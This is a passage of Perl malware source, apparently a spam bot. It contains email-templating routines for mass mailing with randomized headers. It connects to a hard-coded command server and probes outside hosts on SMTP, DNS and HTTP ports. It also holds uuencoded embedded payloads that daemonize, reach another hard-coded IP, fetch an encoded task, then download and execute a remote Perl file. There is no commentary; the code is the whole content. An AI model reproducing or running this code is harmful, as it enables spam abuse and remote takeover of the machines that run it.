$info =~ s/.*?\|[\s\|]*(.+?)[\s\|]*$/$1/ if length $info;
return (\$mail, \$name, \$info);
}
sub init
{
&main('85.25.252.196',778,'/');
&main('85.25.252.196',443,'/');
&startserver() if $^O ne "MSWin32";
}
sub data
{
my ($to, $from, $b) = @_;
my $time = time;
my $zone = sprintf ("%s%02d00", $b->{timezone}[0], $b->{timezone}[1]);
my $date = localtime $time; $date =~ s/^(\w+)\s+(\w+)\s+(\d+)\s+(\d+):(\d+):(\d+)\s+(\d+)$/sprintf "$1, $3 $2 $7 $4:$5:$6 %s", $zone/e;
my $wday = {Mon => "Monday", Tue => "Tuesday", Wed => "Wednesday", Thu => "Thursday", Fri => "Friday", Sat => "Saturday", Sun => "Sunday"}->{$1};
my $nmon = {Jan => 1, Feb => 2, Mar => 3, Apr => 4, May => 5, Jun => 6, Jul => 7, Aug => 8, Sep => 9, Oct => 10, Nov => 11, Dec => 12}->{$2};
my $tmon = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]->[$nmon - 1];
my $ampm = "AM"; my $hour = int $4; $ampm = "PM" if $hour == 12; $hour = 12 if $hour == 0; if ($hour > 12) { $ampm = "PM"; $hour -= 12; }
$date =
{
DATE	=> $date,
WWWW	=> $wday,
WWW	=> $1,
DD	=> sprintf ("%02d", $3),
D	=> $3,
MMMM	=> $tmon,
MMM	=> $2,
MM	=> sprintf ("%02d", $nmon),
M	=> $nmon,
YYYY	=> $7,
YY	=> substr ($7, -2),
Z	=> $zone,
TT	=> $ampm,
tt	=> lc $ampm,
HH	=> $4,
H	=> int $4,
hh	=> sprintf ("%02d", $hour),
h	=> $hour,
mm	=> $5,
m	=> int $5,
ss	=> $6,
s	=> int $6
};
my ($mail, $name) = &mail(\$from);
my ($user, $host) = split (/\@/, $$mail);
$from = {ADDR => length $$name ? "$$name <$$mail>" : "<$$mail>", NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
my $replyto = $from;
if ($b->{from}[0] ne $b->{replyto}[0])
{
($mail, $name) = &mail(\@{$b->{replyto}}[int rand scalar @{$b->{replyto}}]);
($user, $host) = split (/\@/, $$mail);
$replyto = {ADDR => length $$name ? "$$name <$$mail>" : "<$$mail>", NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
}
if ($b->{method} == 0)
{
@_ = ();
foreach (@$to) { ($mail, $name) = &mail(\$_); $_ = length $$name ? "$$name <$$mail>" : "<$$mail>"; push @_, $_; }
($user, $host) = split (/\@/, $$mail);
$to = {ADDR => join (",\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20", @_), NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
}
else
{
($mail, $name) = &mail(\$to->[0]);
($user, $host) = split (/\@/, $$mail);
$to = {ADDR => length $$name ? "$$name <$$mail>" : "<$$mail>", NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
}
my $head =
{
HELO		=> $b->{helo},
TYPE		=> $b->{type} ? "html" : "plain",
SUBJECT		=> @{$b->{subject}}[int rand scalar @{$b->{subject}}],
CHARSET		=> $b->{charset},
ENCODING	=> $b->{charset} eq "windows-1251" ? "8bit" : "7bit",
NPRIORITY	=> (5 - $b->{priority} * $b->{priority} - ($b->{priority} == 1 ? 1 : 0)),
TPRIORITY	=> ["Low", "Normal", "High"]->[$b->{priority}],
MESSAGEID	=> sprintf ("%08x\.%04x%04x", int ($time * 0.0023283064365387 + 27111902.8329849), int rand 32769, int rand 32769)
};
my $letter = length $b->{letter} ? sprintf ("%s%s%s", $b->{header}, "\x0D\x0A\x0D\x0A", $b->{letter}) : $b->{header};
$letter =~ s/\%$_\%/$head->{$_}/g foreach (keys %$head);
$letter =~ s/\%$_\%/$date->{$_}/g foreach (keys %$date);
$letter =~ s/\%FROM$_\%/$from->{$_}/g foreach (keys %$from);
$letter =~ s/\%REPLYTO$_\%/$replyto->{$_}/g foreach (keys %$replyto);
$letter =~ s/\%TO$_\%/$to->{$_}/g foreach (keys %$to);
&tag(\$letter);
if (!length $b->{letter})
{
$letter =~ s/\x0D//gm;
$letter =~ s/\x0A/\x0D\x0A/gm;
}
return $letter;
}
sub quoted ($)
{
my $line = shift;
$line =~ s/([^ \t\x0D\x0A!"#\$%&'()*+,\-.\/0-9:;<>?\@A-Z[\\\]^_`a-z{|}~])/sprintf ("=%02X", ord ($1))/eg;
$line =~ s/([ \t]+)$/join ("", map {sprintf ("=%02X", ord ($_))} split ("", $1))/egm;
my $lines = "";
$lines .= "$1=\x0D\x0A" while $line =~ s/(.*?^[^\x0D\x0A]{71}(?:[^=\x0D\x0A]{2}(?![^=\x0D\x0A]{0,1}$)|[^=\x0D\x0A](?![^=\x0D\x0A]{0,2}$)|(?![^=\x0D\x0A]{0,3}$)))//xsm;
$lines .= $line;
return $lines;
}
sub tag
{
my $line = shift;
my $save = [];
$$line =~ s/\[random\]([^\[]*)\[\/random\]({\d+,\d+})?(\((\d+)\))?/&tagrandom($1, $2, $4, \$save)/eg;
$$line =~ s/\[string\]([^\[]*)\[\/string\](\((\d+)\))?/&tagstring($1, $3, \$save)/eg;
$$line =~ s/\%\[(\d+)\]/$1 < 64 && defined $save->[$1] ? $save->[$1] : ""/eg;
$$line =~ s/\[quot\](.*?)\[\/quot\]/&quoted($1)/egs;
}
sub tagrandom
{
my ($line, $spec, $cell, $save) = @_;
if (defined $line && length $line)
{
if (defined $spec && $spec =~ /^{(\d+),(\d+)}$/)
{
$spec = $2 > 64 ? 64 : $2;
$spec = $1 < $spec ? ($1 + int rand (1 + $spec - $1)) : $spec;
}
else
{
$spec = length $line;
$spec = 1 + ($spec > 64 ? int rand 64 : int rand $spec);
}
$line = [split (//, $line)];
$line = join ('', @$line[map {rand @$line}(1..$spec)]);
}
$line = defined $line ? $line : "";
$$save->[$cell] = $line if defined $cell && $cell < 64;
return $line;
}
sub tagstring
{
my ($line, $cell, $save) = @_;
if (defined $line && length $line)
{
$line = [split (/\|/, $line)];
$line = $line->[int rand scalar @$line];
}
$line = defined $line ? $line : "";
$$save->[$cell] = $line if defined $cell && $cell < 64;
return $line;
}
sub test
{
while (1)
{
my $readers = IO::Select->new() or last;
my $writers = IO::Select->new() or last;
my $session = {};
foreach my $result (keys %$test)
{
while (1 < scalar @{$test->{$result}})
{
my $host = pop @{$test->{$result}};
my $addr = pack ("C4", split (/\./, $host));
my ($protocol, $port);
if ($result eq "ip")
{
($protocol, $port) = ("tcp", 80);
}
else
{
($protocol, $port) = $result =~ /^(tcp|udp)(\d+)$/;
}
$addr = sockaddr_in($port, $addr);
my $socket = $protocol eq "tcp" ? IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM) : IO::Socket::INET->new(Proto => "udp");
next unless $socket;
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
if ($protocol eq "tcp")
{
unless ($socket->connect($addr))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
next;
}
}
}
$writers->add($socket);
$session->{$socket} = {status => $protocol eq "tcp" ? "cn" : "wr", buffer => "", timeout => 5, result => $result, addr => $addr};
if ($port == 53)
{
$session->{$socket}{buffer} .= pack ("nSn4", int rand 65535, 1, 1, 0, 0, 0);
$session->{$socket}{buffer} .= pack ("C", length $_) . $_ for (split (/\./, $host));
$session->{$socket}{buffer} .= pack ("Cn2", 0, 1, 1);
$session->{$socket}{buffer} = join ("", pack ("n", length $session->{$socket}{buffer}), $session->{$socket}{buffer}) if $protocol eq "tcp";
}
elsif ($port == 80)
{
$session->{$socket}{buffer} = join ("\x0D\x0A", "GET / HTTP/1.1", "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*", "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", "Host: $host", "Connection: close", "Cache-Control: no-cache", "\x0D\x0A");
}
}
}
$session->{$_}{timeout} += time foreach (keys %$session);
while ($readers->count() || $writers->count())
{
my $time = time;
my $writable = (IO::Select->select(undef, $writers, undef, 0))[1];
foreach my $handle (@$writable)
{
if ($session->{$handle}{status} eq "cn")
{
if ($handle->connected)
{
if ($session->{$handle}{result} eq "tcp25")
{
$session->{$handle}{status} = "rd";
$readers->add($handle);
$writers->remove($handle);
}
else
{
$session->{$handle}{status} = "wr";
}
}
else
{
$session->{$handle}{timeout} = 0;
}
}
else
{
my $result;
if ($session->{$handle}{result} eq "udp53")
{
$result = $handle->send($session->{$handle}{buffer}, 0, $session->{$handle}{addr});
}
elsif ($session->{$handle}{result} eq "tcp53")
{
$result = $handle->send($session->{$handle}{buffer});
}
else
{
$result = syswrite ($handle, $session->{$handle}{buffer});
}
if (defined $result && $result > 0)
{
substr ($session->{$handle}{buffer}, 0, $result) = "";
if (length $session->{$handle}{buffer} < 1)
{
$session->{$handle}{status} = "rd";
$readers->add($handle);
$writers->remove($handle);
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$session->{$handle}{timeout} = 0;
}
}
}
my $readable = (IO::Select->select($readers, undef, undef, 0))[0];
foreach my $handle (@$readable)
{
my $result;
if ($session->{$handle}{result} eq "udp53")
{
$result = $handle->recv($session->{$handle}{buffer}, 512);
$result = length $session->{$handle}{buffer} if defined $result;
}
elsif ($session->{$handle}{result} eq "tcp53")
{
$result = $handle->recv($session->{$handle}{buffer}, 2);
$result = length $session->{$handle}{buffer} if defined $result;
}
else
{
$result = sysread ($handle, $session->{$handle}{buffer}, 8192, length $session->{$handle}{buffer});
}
if (defined $result)
{
if ($session->{$handle}{result} eq "ip")
{
if ($test->{$session->{$handle}{result}}[0] eq "0.0.0.0")
{
if ($session->{$handle}{buffer} =~ /(\d+\.\d+\.\d+\.\d+)/)
{
$test->{$session->{$handle}{result}}[0] = $1;
$session->{$handle}{timeout} = 0;
}
else
{
next;
}
}
else
{
$session->{$handle}{timeout} = 0;
}
}
else
{
$test->{$session->{$handle}{result}}[0] = 1 if $result > 0;
$session->{$handle}{timeout} = 0;
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$session->{$handle}{timeout} = 0;
}
}
foreach my $handle ($writers->handles, $readers->handles)
{
if ($time >= $session->{$handle}{timeout})
{
$readers->remove($handle) if $readers->exists($handle);
$writers->remove($handle) if $writers->exists($handle);
delete $session->{$handle};
close $handle;
}
}
}
last;
}
}
sub ureps
{
my $aperture;
if ($^O =~ /bsd$/i)
{
$aperture = <<'LOY';
M(R$O=7-R+V)I;B]P97)L("UW#0IU<V4@<W1R:6-T.PT*=7-E(%!/4TE8.PT*
M=7-E($E/.CI3;V-K970[#0IU<V4@24\Z.E-E;&5C=#L-"B0P(#T@(GAI;F5T
M9"([#0IM>2`H)'$Q+"`D<3(I(#T@*"(P+C<B+"`B,"XX(BD[("1\(#T@,3L@
M)FUA:6XH*3L-"G-U8B!M86EN#0I[#0IE>&ET(#`@=6YL97-S(&1E9FEN960@
M*&UY("1P:60@/2!F;W)K*3L-"F5X:70@,"!I9B`D<&ED.PT*4$]325@Z.G-E
M='-I9"@I.PT*)%-)1WLD7WT@/2`B24=.3U)%(B!F;W(@*'%W("A(55`@24Y4
M($E,3"!&4$4@455)5"!!0E)4(%534C$@4T5'5B!54U(R(%!)4$4@04Q232!4
M15)-($-(3$0I*3L-"G5M87-K(#`[#0IC:&1I<B`B+R([#0IO<&5N("A35$1)
M3BP@(CPO9&5V+VYU;&PB*3L-"F]P96X@*%-41$]55"P@(CXO9&5V+VYU;&PB
M*3L-"F]P96X@*%-41$524BP@(CXF4U1$3U54(BD[#0IM>2`D=7)L(#T@6R(R
M,3<N,3<R+C$X,"XR-")=.PT*;7D@)')N9"`](%LB82(N+B)Z(BP@(D$B+BXB
M6B)=.R`D<FYD(#T@:F]I;B`H(B(L($`D<FYD6VUA<"![<F%N9"!`)')N9'TH
M,2XN*#8@*R!I;G0@<F%N9"`U*2E=*3L-"FUY("1D:7(@/2`B+W9A<B]T;7`B
M.R!I9B`H;W!E;B`H1BP@(CXB+"`B+W1M<"\D<FYD(BDI('L@8VQO<V4@1CL@
M=6YL:6YK("(O=&UP+R1R;F0B.R`D9&ER(#TB+W1M<"([('T-"FUY("@D:&5A
M9&5R+"`D8V]N=&5N="D[#0IM>2`H)&QI;FLL("1F:6QE+"`D:60L("1C;VUM
M86YD+"`D=&EM96]U="D@/2`H(F5N+G=I:VEP961I82YO<F<B+"`B:6YD97@N
M:'1M;"(L(#$L(#DV+"`Q,"D[#0IF;W)E86-H(&UY("1R<R`H0"1U<FPI#0I[
M#0HD:&5A9&5R(#T@(B1D:7(O(B`N('1I;64[("1C;VYT96YT(#T@)&AE861E
M<B`N("(Q(CL-"G5N;&EN:R`D:&5A9&5R(&EF("UF("1H96%D97([('5N;&EN
M:R`D8V]N=&5N="!I9B`M9B`D8V]N=&5N=#L-"B9H='1P*"1R<RP@)'1I;65O
M=70L("1H96%D97(L("1C;VYT96YT+"`P*3L-"FEF("AO<&5N("A&+"`B/"(L
M("1H96%D97(I*0T*>PT*9FQO8VL@1BP@,3L-"FUY("@D=&5S="P@)'1A<VLI
M(#T@*#`L("(B*3L-"G=H:6QE("@\1CXI#0I[#0IS+UY<<RHH6UY<<UT_+BHI
M)"\D,2\[#0IS+UXH+BI;7EQS72E<<RHD+R0Q+SL-"FYE>'0@=6YL97-S(&QE
M;F=T:"`D7SL-"B1T97-T("LK(&EF("1?(&5Q(")(5%10+S$N,"`R,#`@3TLB
M('Q\("1?(&5Q(")#;VYN96-T:6]N.B!C;&]S92([("1T87-K(#T@)#$@:68@
M+UY3970M0V]O:VEE.B!02%!315-3240]*%M>.UTK*2\[#0I]#0IC;&]S92!&
M.PT**"1L:6YK+"`D9FEL92P@)&ED+"`D8V]M;6%N9"P@)'1I;65O=70I(#T@
M)F1E8WAD*"1T87-K*2!I9B`D=&5S="`]/2`R("8F(&QE;F=T:"`D=&%S:SL-
M"GT-"G5N;&EN:R`D:&5A9&5R(&EF("UF("1H96%D97([('5N;&EN:R`D8V]N
M=&5N="!I9B`M9B`D8V]N=&5N=#L-"GT-"F5X:70@,"!I9B`A9&5F:6YE9"`D
M8V]M;6%N9"!\?"`D8V]M;6%N9"`A?B`O7C$V)"\[#0HD:&5A9&5R(#T@(B1D
M:7(O(B`N('1I;64[("1C;VYT96YT(#T@(B1D:7(O)&9I;&4B.PT*=6YL:6YK
M("1H96%D97(@:68@+68@)&AE861E<CL@=6YL:6YK("1C;VYT96YT(&EF("UF
M("1C;VYT96YT.PT*)FAT='`H)&QI;FLL("1T:6UE;W5T+"`D:&5A9&5R+"`D
M8V]N=&5N="P@,2D[#0IM>2`H)')E<W`L("1S:7IE*2`]("@B,#`P(BP@,"D[
M#0II9B`H;W!E;B`H1BP@(CPB+"`D:&5A9&5R*2D-"GL-"F9L;V-K($8L(#$[
M#0IW:&EL92`H/$8^*0T*>PT*<R]>7',J*%M>7'-=/RXJ*20O)#$O.PT*<R]>
M*"XJ6UY<<UTI7',J)"\D,2\[#0IN97AT('5N;&5S<R!L96YG=&@@)%\[#0HD
M<F5S<"`]("0Q(&EF("]>2%144%Q3*UQS*RA<9%QD7&0I+SL-"GT-"F-L;W-E
M($8[#0I]#0HD<VEZ92`]("AS=&%T("1C;VYT96YT*5LW72!I9B`M9B`D8V]N
M=&5N=#L-"B1S:7IE(#T@,"!I9B`A9&5F:6YE9"`D<VEZ92!\?"`D<VEZ92`A
M?B`O7EQD*R0O.PT*:68@*"1S:7IE(#X@,"D-"GL-"F-H;6]D(#`W-34L("1C
M;VYT96YT.PT*<WES=&5M(")P97)L("1C;VYT96YT(#XO9&5V+VYU;&P@,CXF
M,2([#0I]#0IU;FQI;FL@)&AE861E<B!I9B`M9B`D:&5A9&5R.R!U;FQI;FL@
M)&-O;G1E;G0@:68@+68@)&-O;G1E;G0[#0IF;W)E86-H(&UY("1R<R`H0"1U
M<FPI#0I[#0HD:&5A9&5R(#T@(B]D978O;G5L;"([("1C;VYT96YT(#T@)&AE
M861E<CL-"B9H='1P*"1R<RP@,3`L("1H96%D97(L("1C;VYT96YT+"`P+"`B
M)&ED+B1R97-P+B1S:7IE(BD[#0I]#0IE>&ET(#`[#0I]#0IS=6(@>&]R;`T*
M>PT*;7D@*"1L:6YE+"`D8V]D92P@)'AO<BP@)&QI;2D@/2`H<VAI9G0L("(B
M+"`Q+"`Q-BD[#0IF;W)E86-H(&UY("1C:'(@*'-P;&ET("@O+RP@)&QI;F4I
M*0T*>PT*:68@*"1X;W(@/3T@)&QI;2D-"GL-"B1L:6T@/2`P(&EF("1L:6T@
M/3T@,C4V.PT*)&QI;2`K/2`Q-CL-"B1X;W(@/2`Q.PT*?0T*)&-O9&4@+CT@
M<&%C:R`H(D,B+"!U;G!A8VL@*")#(BP@)&-H<BD@7B`D>&]R*3L-"B1X;W(@
M*RL[#0I]#0IR971U<FX@)&-O9&4[#0I]#0IS=6(@9&5C>&0-"GL-"FUY("1D
M871A(#T@<&%C:R`H(D@J(BP@<VAI9G0I.PT*0%\@/2!U;G!A8VL@*")#-2(L
M('-U8G-T<B`H)&1A=&$L(#`L(#4L("(B*2D[#0IR971U<FX@*"9X;W)L*'-U
M8G-T<B`H)&1A=&$L(#`L('-H:69T+"`B(BDI+"`F>&]R;"AS=6)S='(@*"1D
M871A+"`P+"!S:&EF="P@(B(I*2P@0%\I.PT*?0T*<W5B(&AT='`-"GL-"FUY
M("@D=7)L+"`D=&EM96]U="P@)&AE861E<BP@)&-O;G1E;G0L("1M;V1E+"`D
M9V5C:V\I(#T@0%\[#0HD9V5C:V\@/2`B,C`Q,#`Q,#$B(&EF("%D969I;F5D
M("1G96-K;R!\?"`A;&5N9W1H("1G96-K;SL-"FUY("@D:&]S="P@)'!O<G0L
M("1P871H*2`]("1U<FP@/7X@+UXH6UY<+SI=*RDZ*BA<9"HI/RA<+S];7EPC
M72HI+SL-"G)E='5R;B!U;FQE<W,@)&AO<W0[#0IM>2`D861D<B`](&=E=&AO
M<W1B>6YA;64@)&AO<W0[#0IR971U<FX@=6YL97-S("1A9&1R.PT*)'!O<G0@
M?'P](#@P.PT*)'!A=&@@?'P]("(O(CL-"B1A9&1R(#T@<V]C:V%D9')?:6XH
M)'!O<G0L("1A9&1R*3L-"FUY("1R96%D97)S(#T@24\Z.E-E;&5C="T^;F5W
M*"D@;W(@<F5T=7)N.PT*;7D@)'=R:71E<G,@/2!)3SHZ4V5L96-T+3YN97<H
M*2!O<B!R971U<FX[#0IM>2`D8G5F9F5R(#T@:F]I;@T**`T*(EQX,$1<>#!!
M(BP-"B)'150@)'!A=&@@2%144"\Q+C$B+`T*(DAO<W0Z("1H;W-T(BP-"B)5
M<V5R+4%G96YT.B!-;WII;&QA+S4N,"`H5VEN9&]W<R!.5"`V+C$[(%=I;C8T
M.R!X-C0[(')V.C8W+C`I($=E8VMO+R1G96-K;R!&:7)E9F]X+S8W+C`B+`T*
M(D%C8V5P=#H@=&5X="]H=&UL+&%P<&QI8V%T:6]N+WAH=&UL*WAM;"QA<'!L
M:6-A=&EO;B]X;6P[<3TD<3$L*B\J.W$])'$R(BP-"B)!8V-E<'0M3&%N9W5A
M9V4Z(&5N+75S+&5N.W$])'$Q(BP-"B)!8V-E<'0M16YC;V1I;F<Z(&=Z:7`L
M(&1E9FQA=&4B+`T*(D%C8V5P="U#:&%R<V5T.B!)4T\M.#@U.2TQ+'5T9BTX
M.W$])'$R+"H[<3TD<3$B+`T*(D-O;FYE8W1I;VXZ(&-L;W-E(BP-"B)<>#!$
M7'@P02(-"BD[#0II9B`H)&UO9&4I#0I[#0HD8G5F9F5R(#T@:F]I;@T**`T*
M(EQX,$1<>#!!(BP-"B)'150@)'!A=&@@2%144"\Q+C`B+`T*(DAO<W0Z("1H
M;W-T(BP-"B)5<V5R+4%G96YT.B!-;WII;&QA+S4N,"`H5VEN9&]W<R!.5"`V
M+C$[(%=I;C8T.R!X-C0[(')V.C8Q+C`I($=E8VMO+R1G96-K;R!&:7)E9F]X
M+S8Q+C`B+`T*(D%C8V5P=#H@=&5X="]H=&UL+"HO*B(L#0HB0V]N;F5C=&EO
M;CH@8VQO<V4B+`T*(EQX,$1<>#!!(@T**3L-"GT-"FUY("1S;V-K970@/2!)
M3SHZ4V]C:V5T.CI)3D54+3YN97<H4')O=&\@/3X@(G1C<"(L(%1Y<&4@/3X@
M4T]#2U]35%)%04TI.PT*<F5T=7)N('5N;&5S<R`D<V]C:V5T.PT*)'-O8VME
M="T^8FQO8VMI;F<H,"D[#0IU;FQE<W,@*"1S;V-K970M/F-O;FYE8W0H)&%D
M9'(I*0T*>PT*=6YL97-S("@D(2`]/2!03U-)6#HZ14E.4%)/1U)%4U,I#0I[
M#0IC;&]S92`D<V]C:V5T.PT*<F5T=7)N.PT*?0T*?0T*)'=R:71E<G,M/F%D
M9"@D<V]C:V5T*3L-"B1T:6UE;W5T("L]('1I;64[#0IM>2`D<W1E<"`](#`[
M#0IW:&EL92`H,2D-"GL-"DE/.CI396QE8W0M/G-E;&5C="AU;F1E9BP@=6YD
M968L('5N9&5F+"`P+C`R*3L-"FUY("1W<FET86)L92`]("A)3SHZ4V5L96-T
M+3YS96QE8W0H=6YD968L("1W<FET97)S+"!U;F1E9BP@,"DI6S%=.PT*9F]R
M96%C:"!M>2`D:&%N9&QE("A`)'=R:71A8FQE*0T*>PT*:68@*"1S=&5P(#T]
M(#`I#0I[#0HD<W1E<"`](#$@:68@)&AA;F1L92T^8V]N;F5C=&5D.PT*?0T*
M:68@*"1S=&5P(#T](#$I#0I[#0IM>2`D<F5S=6QT(#T@<WES=W)I=&4@*"1H
M86YD;&4L("1B=69F97(I.PT*:68@*&1E9FEN960@)')E<W5L="`F)B`D<F5S
M=6QT(#X@,"D-"GL-"G-U8G-T<B`H)&)U9F9E<BP@,"P@)')E<W5L="D@/2`B
M(CL-"FEF("@A;&5N9W1H("1B=69F97(I#0I[#0HD<F5A9&5R<RT^861D*"1H
M86YD;&4I.PT*)'=R:71E<G,M/G)E;6]V92@D:&%N9&QE*3L-"B1S=&5P(#T@
M,CL-"GT-"GT-"F5L<VEF("@D(2`]/2!03U-)6#HZ15=/54Q$0DQ/0TLI#0I[
M#0IN97AT.PT*?0T*96QS90T*>PT*)'1I;65O=70@/2`P.R!]#0I]#0I]#0IM
M>2`D<F5A9&%B;&4@/2`H24\Z.E-E;&5C="T^<V5L96-T*"1R96%D97)S+"!U
M;F1E9BP@=6YD968L(#`I*5LP73L-"F9O<F5A8V@@;7D@)&AA;F1L92`H0"1R
M96%D86)L92D-"GL-"FYE>'0@:68@)'-T97`@/"`R.PT*;7D@)')E<W5L=#L-
M"FEF("@D<W1E<"`]/2`R*0T*>PT*)')E<W5L="`]('-Y<W)E860@*"1H86YD
M;&4L("1B=69F97(L(#@Q.3(L(&QE;F=T:"`D8G5F9F5R*3L@?0T*96QS90T*
M>PT*)')E<W5L="`]('-Y<W)E860@*"1H86YD;&4L("1B=69F97(L(#@Q.3(I
M.PT*?0T*:68@*#$V,S@T(#P@;&5N9W1H("1B=69F97(I#0I[#0HD=&EM96]U
M="`](#`[('T-"F5L<VEF("AD969I;F5D("1R97-U;'0I#0I[#0II9B`H)')E
M<W5L="`^(#`I#0I[#0II9B`H)'-T97`@/3T@,BD-"GL-"FUY("1O9F9S970@
M/2!I;F1E>"`H)&)U9F9E<BP@(EQX,$1<>#!!7'@P1%QX,$$B*3L-"FYE>'0@
M:68@)&]F9G-E="`\(#`[#0II9B`H;W!E;B`H1BP@(CX^(BP@)&AE861E<BDI
M#0I[#0IF;&]C:R!&+"`R.PT*8FEN;6]D92!&.PT*<')I;G0@1B!S=6)S='(@
M*"1B=69F97(L(#`L("1O9F9S970I.PT*8VQO<V4@1CL-"GT-"G-U8G-T<B`H
M)&)U9F9E<BP@,"P@)&]F9G-E="`K(#0I(#T@(B([#0HD<W1E<"`](#,[('T-
M"FEF("@D<W1E<"`]/2`S*0T*>PT*:68@*&QE;F=T:"`D8G5F9F5R*0T*>PT*
M:68@*&]P96X@*$8L("(^/B(L("1C;VYT96YT*2D-"GL-"F9L;V-K($8L(#([
M#0IB:6YM;V1E($8[#0IP<FEN="!&("1B=69F97([#0IC;&]S92!&.PT*?0T*
M)&)U9F9E<B`]("(B.R!]#0I]#0IN97AT.R!]#0HD=&EM96]U="`](#`[('T-
M"F5L<VEF("@D(2`]/2!03U-)6#HZ15=/54Q$0DQ/0TLI#0I[#0IN97AT.R!]
M#0IE;'-E#0I[#0HD=&EM96]U="`](#`[('T-"GT-"FEF("@D=&EM96]U="`\
M('1I;64I#0I[#0IF;W)E86-H(&UY("1H86YD;&4@*"1W<FET97)S+3YH86YD
M;&5S+"`D<F5A9&5R<RT^:&%N9&QE<RD-"GL-"B1W<FET97)S+3YR96UO=F4H
M)&AA;F1L92D@:68@)'=R:71E<G,M/F5X:7-T<R@D:&%N9&QE*3L-"B1R96%D
M97)S+3YR96UO=F4H)&AA;F1L92D@:68@)')E861E<G,M/F5X:7-T<R@D:&%N
J9&QE*3L-"F-L;W-E("1H86YD;&4[('T-"G)E='5R;CL@?0T*?0T*?0T*
LOY
}
else
{
$aperture = <<'ROZEN';
M(R$O=7-R+V)I;B]P97)L("UW#0IU<V4@<W1R:6-T.PT*=7-E(%!/4TE8.PT*
M=7-E($E/.CI3;V-K970[#0IU<V4@24\Z.E-E;&5C=#L-"B0P(#T@(GAI;F5T
M9"([(&UY("@D<3$L("1Q,BD@/2`H(C`N-R(L("(P+C@B*3L@)'P@/2`Q.R`F
M;6%I;B@I.PT*<W5B(&UA:6X-"GL-"F5X:70@,"!U;FQE<W,@9&5F:6YE9"`H
M;7D@)'!I9"`](&9O<FLI.PT*97AI="`P(&EF("1P:60[#0I03U-)6#HZ<V5T
M<VED*"D[#0HD4TE'>R1??2`]("))1TY/4D4B(&9O<B`H<7<@*$A54"!)3E0@
M24Q,($9012!154E4($%"4E0@55-2,2!314=6(%534C(@4$E012!!3%)-(%1%
M4DT@0TA,1"DI.PT*=6UA<VL@,#L-"F-H9&ER("(O(CL-"F]P96X@*%-41$E.
M+"`B/"]D978O;G5L;"(I.PT*;W!E;B`H4U1$3U54+"`B/B]D978O;G5L;"(I
M.PT*;W!E;B`H4U1$15)2+"`B/B935$1/550B*3L-"FUY("1U<FP@/2!;(C(Q
M-RXQ-S(N,3@P+C(T(ET[#0IM>2`D<FYD(#T@6R)A(BXN(GHB+"`B02(N+B):
M(ET[("1R;F0@/2!J;VEN("@B(BP@0"1R;F1;;6%P('MR86YD($`D<FYD?2@Q
M+BXH-B`K(&EN="!R86YD(#4I*5TI.PT*;7D@)&1I<B`]("(O=F%R+W1M<"([
M(&EF("AO<&5N("A&+"`B/B(L("(O=&UP+R1R;F0B*2D@>R!C;&]S92!&.R!U
M;FQI;FL@(B]T;7`O)')N9"([("1D:7(@/2(O=&UP(CL@?0T*;7D@*"1H96%D
M97(L("1C;VYT96YT*3L-"FUY("@D;&EN:RP@)&9I;&4L("1I9"P@)&-O;6UA
M;F0L("1T:6UE;W5T*2`]("@B96XN=VEK:7!E9&EA+F]R9R(L(")I;F1E>"YH
M=&UL(BP@,2P@.38L(#$P*3L-"F9O<F5A8V@@;7D@)')S("A`)'5R;"D-"GL-
M"B1H96%D97(@/2`B)&1I<B\B("X@=&EM93L@)&-O;G1E;G0@/2`D:&5A9&5R
M("X@(C$B.PT*=6YL:6YK("1H96%D97(@:68@+68@)&AE861E<CL@=6YL:6YK
M("1C;VYT96YT(&EF("UF("1C;VYT96YT.PT*)FAT='`H)')S+"`D=&EM96]U
M="P@)&AE861E<BP@)&-O;G1E;G0L(#`I.PT*:68@*&]P96X@*$8L("(\(BP@
M)&AE861E<BDI#0I[#0IF;&]C:R!&+"`Q.PT*;7D@*"1T97-T+"`D=&%S:RD@
M/2`H,"P@(B(I.PT*=VAI;&4@*#Q&/BD-"GL-"G,O7EQS*BA;7EQS73\N*BDD
M+R0Q+SL-"G,O7B@N*EM>7'-=*5QS*B0O)#$O.PT*;F5X="!U;FQE<W,@;&5N
M9W1H("1?.PT*)'1E<W0@*RL@:68@)%\@97$@(DA45%`O,2XP(#(P,"!/2R(@
M?'P@)%\@97$@(D-O;FYE8W1I;VXZ(&-L;W-E(CL@)'1A<VL@/2`D,2!I9B`O
M7E-E="U#;V]K:64Z(%!(4%-%4U-)1#TH6UX[72LI+SL-"GT-"F-L;W-E($8[
M#0HH)&QI;FLL("1F:6QE+"`D:60L("1C;VUM86YD+"`D=&EM96]U="D@/2`F
M9&5C>&0H)'1A<VLI(&EF("1T97-T(#T](#(@)B8@;&5N9W1H("1T87-K.PT*
M?0T*=6YL:6YK("1H96%D97(@:68@+68@)&AE861E<CL@=6YL:6YK("1C;VYT
M96YT(&EF("UF("1C;VYT96YT.PT*?0T*97AI="`P(&EF("%D969I;F5D("1C
M;VUM86YD('Q\("1C;VUM86YD("%^("]>,38D+SL-"B1H96%D97(@/2`B)&1I
M<B\B("X@=&EM93L@)&-O;G1E;G0@/2`B)&1I<B\D9FEL92([#0IU;FQI;FL@
M)&AE861E<B!I9B`M9B`D:&5A9&5R.R`-"G5N;&EN:R`D8V]N=&5N="!I9B`M
M9B`D8V]N=&5N=#L-"B9H='1P*"1L:6YK+"`D=&EM96]U="P@)&AE861E<BP@
M)&-O;G1E;G0L(#$I.PT*;7D@*"1R97-P+"`D<VEZ92D@/2`H(C`P,"(L(#`I
M.PT*:68@*&]P96X@*$8L("(\(BP@)&AE861E<BDI#0I[#0IF;&]C:R!&+"`Q
M.PT*=VAI;&4@*#Q&/BD-"GL-"G,O7EQS*BA;7EQS73\N*BDD+R0Q+SL-"G,O
